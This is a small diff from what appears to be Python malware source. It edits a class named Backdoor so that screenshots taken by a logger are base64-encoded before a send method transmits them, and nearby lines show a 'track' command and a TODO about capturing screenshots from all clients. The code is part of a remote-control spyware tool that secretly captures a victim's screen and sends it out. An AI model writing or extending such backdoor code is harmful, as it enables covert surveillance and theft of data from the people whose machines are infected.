@@ -193,6 +193,7 @@ class Backdoor:
                 # TODO Get screenshot from all clients
 
                 image = self.logger.get_screenshot()
+                image = base64.b64encode(image).decode()
                 self.__send_data(image)
 
             elif command[0] == "track":
